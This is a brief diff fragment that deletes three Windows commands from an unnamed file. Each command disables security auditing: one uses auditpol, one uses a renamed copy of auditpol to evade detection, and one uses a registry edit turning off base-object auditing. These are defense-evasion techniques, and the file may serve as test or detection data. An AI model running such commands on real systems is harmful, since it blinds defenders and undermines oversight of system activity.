@@ -1,3 +1,0 @@
-auditpol.exe /set /category:"Detailed Tracking" /success:disable
-copy auditpol.exe ap.exe && ap.exe /set /subcategory:"Process Creation" /success:disable /failure:disable
-reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "AuditBaseObjects" /t REG_DWORD /d 0 /f
